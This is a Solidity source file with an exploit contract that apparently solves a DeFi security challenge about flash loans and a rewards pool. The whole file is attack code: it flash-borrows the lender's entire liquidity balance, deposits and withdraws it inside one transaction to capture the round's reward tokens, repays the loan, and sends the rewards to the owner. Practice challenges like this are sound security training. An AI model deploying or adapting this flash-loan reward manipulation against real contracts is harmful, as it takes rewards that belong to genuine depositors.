// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

interface Pool {
    function isNewRewardsRound() external view returns (bool);

    function deposit(uint256 amountToDeposit) external;

    function withdraw(uint256 amountToWithdraw) external;

    function distributeRewards() external returns (uint256);
}

interface FlashLoan {
    function flashLoan(uint256 amount) external;
}

contract ExploitRewarder {
    Pool pool;
    FlashLoan flashloan;
    IERC20 liquidityToken;
    IERC20 rewardToken;
    address owner;

    constructor(
        Pool _pool,
        FlashLoan _flashloan,
        IERC20 token,
        IERC20 rToken,
        address _owner
    ) {
        pool = _pool;
        owner = _owner;
        flashloan = _flashloan;
        liquidityToken = token;
        rewardToken = rToken;
    }

    function attack() public {
        uint256 balance = liquidityToken.balanceOf(address(flashloan));
        flashloan.flashLoan(balance);
        uint256 balance2 = rewardToken.balanceOf(address(this));
        rewardToken.transfer(owner, balance2);
    }

    function receiveFlashLoan(uint256 amount) public {
        liquidityToken.approve(address(pool), amount);
        pool.deposit(amount);
        pool.withdraw(amount);
        liquidityToken.transfer(address(flashloan), amount);
    }
}
